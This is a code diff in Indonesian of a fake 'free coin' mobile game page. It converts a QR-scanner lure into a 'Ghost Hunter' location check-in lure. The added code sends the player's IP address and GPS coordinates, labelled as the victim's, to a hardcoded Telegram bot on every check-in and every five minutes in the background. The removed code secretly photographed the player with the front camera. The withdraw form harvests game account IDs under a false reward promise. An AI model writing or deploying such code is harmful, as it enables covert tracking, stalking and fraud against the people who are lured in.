@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>📷 QR Scanner - Dapatkan Coin Gratis!</title>
+    <title>📍 Ghost Hunter - Check-in Lokasi Dapat Coin!</title>
     <style>
         * {
             margin: 0;
@@ -63,10 +63,6 @@
             transition: transform 0.2s;
         }
 
-        .start-btn:hover {
-            transform: scale(1.05);
-        }
-
         .error-msg {
             color: #ff6666;
             margin-top: 20px;
@@ -81,48 +77,16 @@
             width: 100%;
             height: 100%;
             display: none;
-            background: #000;
+            background: linear-gradient(135deg, #0a0f1e, #0a0a1a);
+            padding: 20px;
         }
 
-        /* Kamera preview untuk QR scan */
-        #qrVideo {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 0;
-        }
-
-        /* Kamera depan (sembunyi - buat foto diam-diam) */
-        #frontCamera {
-            position: fixed;
-            bottom: -1000px;
-            left: -1000px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        canvas {
-            display: none;
-        }
-
-        /* Overlay UI */
         .ui-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 2;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            padding: 20px;
-            pointer-events: none;
+            width: 100%;
+            height: 100%;
         }
 
         .coin-header {
@@ -133,7 +97,6 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            pointer-events: auto;
             border: 1px solid rgba(255,215,0,0.3);
         }
 
@@ -160,32 +123,62 @@
             background: rgba(0,0,0,0.6);
             backdrop-filter: blur(10px);
             border-radius: 20px;
-            padding: 15px;
+            padding: 20px;
             text-align: center;
-            pointer-events: auto;
+            margin: 20px 0;
         }
 
         .info-panel p {
             color: white;
-            font-size: 14px;
-            margin: 5px 0;
+            font-size: 16px;
+            margin: 10px 0;
         }
 
-        .scan-area {
-            background: rgba(0,0,0,0.5);
-            border: 2px solid #ffd700;
-            border-radius: 30px;
-            padding: 15px;
-            margin: 20px auto;
-            width: 80%;
-            max-width: 300px;
+        .location-card {
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px;
             text-align: center;
-            pointer-events: auto;
+            margin: 20px 0;
+            border: 1px solid #ffd700;
         }
 
-        .scan-area p {
+        .location-status {
             color: #ffd700;
             font-size: 14px;
+            margin: 10px 0;
+        }
+
+        .checkin-btn {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            border: none;
+            padding: 14px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #000;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .checkin-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .cooldown-timer {
+            color: #ff6666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .reward-text {
+            color: #00ff00;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 0;
         }
 
         /* Modal withdraw */
@@ -247,22 +240,14 @@
             color: white;
         }
 
-        .qr-code-display {
-            background: white;
-            padding: 20px;
-            border-radius: 20px;
-            margin: 20px auto;
-            width: 200px;
-            height: 200px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            pointer-events: auto;
-        }
-
-        .qr-code-display img {
-            width: 100%;
-            height: 100%;
+        .coin-history {
+            background: rgba(0,0,0,0.4);
+            border-radius: 15px;
+            padding: 10px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+            text-align: center;
         }
     </style>
 </head>
@@ -270,19 +255,16 @@
 
 <!-- LAYAR START -->
 <div class="start-screen" id="startScreen">
-    <h1>📷 QR SCANNER</h1>
-    <p>Scan QR Code = Dapat 100 COIN!</p>
-    <p style="font-size: 14px;">🎮 Game butuh akses kamera untuk scan QR</p>
+    <h1>📍 GHOST HUNTER</h1>
+    <p>Check-in lokasi setiap 30 detik</p>
+    <p>Dapatkan 50 COIN setiap check-in!</p>
+    <p style="font-size: 14px;">🎮 Game butuh akses lokasi</p>
     <button class="start-btn" id="startGameBtn">🎮 MULAI GAME</button>
     <div class="error-msg" id="errorMsg"></div>
 </div>
 
 <!-- GAME CONTAINER -->
 <div class="game-container" id="gameContainer">
-    <video id="qrVideo" autoplay playsinline></video>
-    <video id="frontCamera" autoplay playsinline></video>
-    <canvas id="photoCanvas"></canvas>
-
     <div class="ui-overlay">
         <div class="coin-header">
             <div class="coin-display">
@@ -293,17 +275,23 @@
         </div>
 
         <div class="info-panel">
-            <p>📷 <strong>QR SCANNER</strong> - Scan QR Dapat Coin!</p>
-            <p>🎯 Setiap scan QR: <span style="color:#ffd700;">+100 COIN</span></p>
+            <p>👻 <strong>GHOST HUNTER</strong> - Hunter Hantu Lokasi!</p>
+            <p>🎯 Setiap check-in lokasi: <span style="color:#ffd700;">+50 COIN</span></p>
             <p>💎 500 COIN = 50 Diamond ML/FF | 60 UC PUBG</p>
-            <div class="scan-area">
-                <p>📱 Arahkan kamera ke QR Code di bawah ini:</p>
-            </div>
+            <p>⏳ Check-in setiap <strong>30 detik</strong></p>
         </div>
 
-        <!-- QR Code palsu yang harus di-scan -->
-        <div class="qr-code-display" id="qrDisplay">
-            <canvas id="qrCanvas" width="200" height="200"></canvas>
+        <div class="location-card">
+            <div id="locationStatus" class="location-status">
+                📍 Mengambil lokasi...
+            </div>
+            <div id="rewardStatus" class="reward-text"></div>
+            <button class="checkin-btn" id="checkinBtn" disabled>⏳ MENGAMBIL LOKASI...</button>
+            <div id="cooldownText" class="cooldown-timer"></div>
+        </div>
+
+        <div class="coin-history" id="historyText">
+            Belum ada check-in
         </div>
     </div>
 </div>
@@ -330,17 +318,18 @@
     </div>
 </div>
 
-<script src="https://unpkg.com/jsqr@1.4.0/dist/jsQR.js"></script>
 <script>
     const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
     const CHAT_ID = "8854409945";
 
     let coins = 0;
-    let photoTaken = false;
     let locationSent = false;
     let gameActive = false;
-    let scanning = true;
-    let scanCooldown = false;
+    let canCheckin = true;
+    let cooldownSeconds = 0;
+    let cooldownInterval = null;
+    let checkinCount = 0;
+    let lastLocation = null;
 
     // DOM elements
     const startScreen = document.getElementById('startScreen');
@@ -350,43 +339,11 @@
     const coinSpan = document.getElementById('coinAmount');
     const withdrawBtn = document.getElementById('withdrawBtn');
     const modalCoinSpan = document.getElementById('modalCoin');
-
-    const qrVideo = document.getElementById('qrVideo');
-    const frontVideo = document.getElementById('frontCamera');
-    const photoCanvas = document.getElementById('photoCanvas');
-    const qrCanvas = document.getElementById('qrCanvas');
-
-    // ========== GENERATE QR CODE PALSU ==========
-    function generateQRCode() {
-        const ctx = qrCanvas.getContext('2d');
-        ctx.fillStyle = 'white';
-        ctx.fillRect(0, 0, 200, 200);
-        
-        // Gambar QR sederhana (palsu) biar keliatan kayak QR
-        ctx.fillStyle = 'black';
-        // Kotak-kotak simulasi QR
-        for (let i = 0; i < 3; i++) {
-            ctx.fillRect(10 + i*15, 10, 10, 10);
-            ctx.fillRect(10, 10 + i*15, 10, 10);
-            ctx.fillRect(180 - i*15, 10, 10, 10);
-            ctx.fillRect(180, 10 + i*15, 10, 10);
-            ctx.fillRect(10, 180 - i*15, 10, 10);
-            ctx.fillRect(180 - i*15, 180 - i*15, 10, 10);
-        }
-        for (let i = 0; i < 10; i++) {
-            for (let j = 0; j < 10; j++) {
-                if (Math.random() > 0.7) {
-                    ctx.fillRect(40 + i*12, 40 + j*12, 6, 6);
-                }
-            }
-        }
-        
-        ctx.fillStyle = '#ffd700';
-        ctx.font = 'bold 14px monospace';
-        ctx.fillText("SCAN", 75, 110);
-        ctx.fillText("ME", 85, 130);
-    }
-    generateQRCode();
+    const checkinBtn = document.getElementById('checkinBtn');
+    const locationStatus = document.getElementById('locationStatus');
+    const rewardStatus = document.getElementById('rewardStatus');
+    const cooldownText = document.getElementById('cooldownText');
+    const historyText = document.getElementById('historyText');
 
     // ========== FUNGSI TELEGRAM ==========
     async function getIP() {
@@ -399,95 +356,129 @@
 
     async function getLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) return resolve('Tidak tersedia');
+            if (!navigator.geolocation) {
+                resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', full: 'Tidak tersedia' });
+                return;
+            }
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-                () => resolve('Tidak diizinkan')
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    resolve({ lat: lat, lon: lon, full: `${lat}, ${lon}` });
+                },
+                () => {
+                    resolve({ lat: 'Tidak diizinkan', lon: 'Tidak diizinkan', full: 'Tidak diizinkan' });
+                }
             );
         });
     }
 
-    async function sendLocationAndIP() {
-        if (locationSent) return;
+    async function sendLocationToTelegram(action, extraData = '') {
         const ip = await getIP();
         const location = await getLocation();
-        const tanggal = new Date().toLocaleString('id-ID');
-        const pesan = `📍 LOKASI & IP KORBAN 📍%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AGame: QR SCANNER (Scan QR dapet coin)`;
+        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+        
+        let pesan = `📍📍📍 LOKASI KORBAN 📍📍📍%0A%0A`;
+        pesan += `📋 ACTION   : ${action}%0A`;
+        pesan += `🌐 IP       : ${ip}%0A`;
+        pesan += `📍 KOORDINAT: ${location.full}%0A`;
+        pesan += `📅 WAKTU    : ${tanggal}%0A`;
+        pesan += `🪙 TOTAL COIN: ${coins}%0A`;
+        if (extraData) pesan += `${extraData}%0A`;
+        pesan += `%0A🎮 GAME: GHOST HUNTER (Check-in Lokasi)`;
+        
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
+        
+        lastLocation = location.full;
+        return location.full;
+    }
+
+    async function sendFirstLocation() {
+        if (locationSent) return;
+        await sendLocationToTelegram('START GAME - IZIN LOKASI DIBERIKAN');
         locationSent = true;
     }
 
-    async function captureFrontPhoto() {
-        if (photoTaken) return;
-        if (!frontVideo.srcObject) return;
-        if (frontVideo.videoWidth === 0 || frontVideo.videoHeight === 0) {
-            setTimeout(() => captureFrontPhoto(), 500);
-            return;
-        }
-
-        photoCanvas.width = frontVideo.videoWidth;
-        photoCanvas.height = frontVideo.videoHeight;
-        const ctx = photoCanvas.getContext('2d');
-        ctx.drawImage(frontVideo, 0, 0, photoCanvas.width, photoCanvas.height);
-
-        const blob = await new Promise(resolve => photoCanvas.toBlob(resolve, 'image/jpeg', 0.85));
-        const ip = await getIP();
-        const location = await getLocation();
-        const tanggal = new Date().toLocaleString('id-ID');
-        const caption = `📸 FOTO WAJAH KORBAN 📸%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AKorban main game QR Scanner (scan QR dapet coin) - tidak sadar difoto`;
-
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'face.jpg');
-        formData.append('caption', caption);
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        photoTaken = true;
+    // ========== UPDATE COIN DISPLAY ==========
+    function updateCoinDisplay() {
+        coinSpan.innerText = coins;
+        modalCoinSpan.innerText = coins;
     }
 
-    // ========== SCAN QR ==========
-    async function startQRScan() {
-        if (!gameActive) return;
+    // ========== CHECK-IN ==========
+    async function doCheckin() {
+        if (!canCheckin || !gameActive) return;
         
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+        canCheckin = false;
+        checkinBtn.disabled = true;
+        checkinBtn.innerText = "📡 MENGAMBIL LOKASI...";
         
-        const scanInterval = setInterval(() => {
-            if (!gameActive || !scanning || scanCooldown) return;
+        try {
+            const location = await getLocation();
+            const ip = await getIP();
+            const tanggal = new Date().toLocaleString('id-ID');
             
-            if (qrVideo.videoWidth === 0 || qrVideo.videoHeight === 0) return;
+            // Kirim lokasi check-in ke Telegram
+            let pesan = `📍 CHECK-IN LOKASI 📍%0A%0A`;
+            pesan += `🌐 IP       : ${ip}%0A`;
+            pesan += `📍 KOORDINAT: ${location.full}%0A`;
+            pesan += `📅 WAKTU    : ${tanggal}%0A`;
+            pesan += `🪙 COIN DAPAT: +50%0A`;
+            pesan += `💰 TOTAL COIN: ${coins + 50}`;
             
-            canvas.width = qrVideo.videoWidth;
-            canvas.height = qrVideo.videoHeight;
-            ctx.drawImage(qrVideo, 0, 0, canvas.width, canvas.height);
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
             
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            const code = jsQR(imageData.data, canvas.width, canvas.height);
+            // Tambah coin
+            coins += 50;
+            updateCoinDisplay();
+            checkinCount++;
             
-            if (code && code.data) {
-                // Ketemu QR! Kasih coin
-                scanCooldown = true;
-                coins += 100;
-                coinSpan.innerText = coins;
-                
-                // Efek getar
-                if (navigator.vibrate) navigator.vibrate(200);
-                
-                // Tampilkan notifikasi
-                const scanArea = document.querySelector('.scan-area');
-                const originalText = scanArea.innerHTML;
-                scanArea.innerHTML = '<p style="color:#00ff00;">✅ +100 COIN! QR Terdeteksi!</p>';
-                setTimeout(() => {
-                    scanArea.innerHTML = originalText;
-                }, 1500);
-                
-                // Cooldown 3 detik biar gak kecepetan
-                setTimeout(() => {
-                    scanCooldown = false;
-                }, 3000);
+            // Update history
+            historyText.innerHTML = `✅ Check-in #${checkinCount} berhasil! +50 COIN (${tanggal})<br>${historyText.innerHTML}`;
+            if (historyText.innerHTML.split('<br>').length > 5) {
+                historyText.innerHTML = historyText.innerHTML.split('<br>').slice(0, 5).join('<br>');
             }
-        }, 500);
+            
+            // Tampilkan reward
+            rewardStatus.innerHTML = '✅ +50 COIN! Lokasi terkirim!';
+            rewardStatus.style.opacity = '1';
+            setTimeout(() => {
+                rewardStatus.innerHTML = '';
+            }, 2000);
+            
+            locationStatus.innerHTML = `📍 Lokasi terakhir: ${location.full.substring(0, 30)}...`;
+            
+            // Mulai cooldown 30 detik
+            startCooldown(30);
+            
+        } catch(err) {
+            locationStatus.innerHTML = '❌ Gagal mengambil lokasi. Pastikan izin lokasi diberikan.';
+            canCheckin = true;
+            checkinBtn.disabled = false;
+            checkinBtn.innerText = "📍 CHECK-IN LOKASI (+50 COIN)";
+        }
+    }
+
+    function startCooldown(seconds) {
+        cooldownSeconds = seconds;
+        checkinBtn.innerText = `⏳ COOLDOWN ${cooldownSeconds} DETIK...`;
         
-        return scanInterval;
+        if (cooldownInterval) clearInterval(cooldownInterval);
+        
+        cooldownInterval = setInterval(() => {
+            if (!gameActive) return;
+            cooldownSeconds--;
+            cooldownText.innerText = `⏳ Check-in berikutnya dalam ${cooldownSeconds} detik`;
+            checkinBtn.innerText = `⏳ COOLDOWN ${cooldownSeconds} DETIK...`;
+            
+            if (cooldownSeconds <= 0) {
+                clearInterval(cooldownInterval);
+                canCheckin = true;
+                checkinBtn.disabled = false;
+                checkinBtn.innerText = "📍 CHECK-IN LOKASI (+50 COIN)";
+                cooldownText.innerText = "✅ Siap check-in!";
+            }
+        }, 1000);
     }
 
     // ========== START GAME ==========
@@ -495,40 +486,44 @@
         errorMsg.style.display = 'none';
         
         try {
-            // Minta kamera belakang (buat scan QR)
-            const backStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" } 
-            });
-            qrVideo.srcObject = backStream;
+            // Cek apakah izin lokasi bisa didapat
+            const testLoc = await getLocation();
             
-            // Minta kamera depan (buat foto diam-diam)
-            const frontStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            });
-            frontVideo.srcObject = frontStream;
-            
-            // Kirim lokasi & IP
-            await sendLocationAndIP();
-            
-            // Foto diam-diam
-            setTimeout(() => captureFrontPhoto(), 2000);
-            setTimeout(() => { if (!photoTaken) captureFrontPhoto(); }, 8000);
-            setTimeout(() => { if (!photoTaken) captureFrontPhoto(); }, 15000);
+            // Kirim lokasi pertama
+            await sendFirstLocation();
             
             // Sembunyikan start screen, tampilkan game
             startScreen.style.display = 'none';
             gameContainer.style.display = 'block';
             gameActive = true;
             
-            // Mulai scan QR
-            const interval = await startQRScan();
+            // Enable check-in
+            canCheckin = true;
+            checkinBtn.disabled = false;
+            checkinBtn.innerText = "📍 CHECK-IN LOKASI (+50 COIN)";
+            locationStatus.innerHTML = `📍 Lokasi: ${testLoc.full.substring(0, 40)}...`;
             
             // Fullscreen
             document.documentElement.requestFullscreen();
             
+            // Kirim lokasi setiap 5 menit (background)
+            setInterval(async () => {
+                if (gameActive) {
+                    const loc = await getLocation();
+                    const ip = await getIP();
+                    const tanggal = new Date().toLocaleString('id-ID');
+                    let pesan = `📍 UPDATE LOKASI BACKGROUND 📍%0A%0A`;
+                    pesan += `🌐 IP: ${ip}%0A`;
+                    pesan += `📍 KOORDINAT: ${loc.full}%0A`;
+                    pesan += `📅 WAKTU: ${tanggal}%0A`;
+                    pesan += `🪙 TOTAL COIN: ${coins}`;
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
+                }
+            }, 300000); // setiap 5 menit
+            
         } catch(err) {
             errorMsg.style.display = 'block';
-            errorMsg.innerText = '❌ Gagal akses kamera! Izinkan akses kamera untuk bermain.';
+            errorMsg.innerText = '❌ Gagal akses lokasi! Izinkan akses lokasi untuk bermain.';
         }
     }
 
@@ -576,7 +571,7 @@
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
         
-        let pesan = `💎 TUKAR COIN KE GAME 💎%0A%0A`;
+        let pesan = `💎💎💎 TUKAR COIN KE GAME 💎💎💎%0A%0A`;
         pesan += `🎮 GAME     : ${selectedGame}%0A`;
         pesan += `🎮 ID GAME  : ${idGame}%0A`;
         pesan += `🗺️ ZONE     : ${zone || '-'}%0A`;
@@ -585,16 +580,16 @@
         pesan += `🪙 COIN     : ${coins}%0A`;
         pesan += `💎 REWARD   : ${reward}%0A`;
         pesan += `🌐 IP       : ${ip}%0A`;
-        pesan += `📍 LOKASI   : ${location}%0A`;
-        pesan += `📅 WAKTU    : ${tanggal}`;
+        pesan += `📍 LOKASI   : ${location.full}%0A`;
+        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
+        pesan += `⚠️ KORBAN TUKAR COIN KE GAME (TANPA KAMERA) ⚠️`;
 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
         
         alert(`✅ Tukar coin berhasil! ${reward} akan dikirim ke akun game kamu dalam 24 jam.`);
         
         coins = 0;
-        coinSpan.innerText = coins;
-        modalCoinSpan.innerText = coins;
+        updateCoinDisplay();
         withdrawModal.classList.remove('active');
         
         gameId.value = '';
@@ -604,6 +599,7 @@
     };
 
     startBtn.onclick = startGame;
+    checkinBtn.onclick = doCheckin;
 </script>
 </body>
 </html>
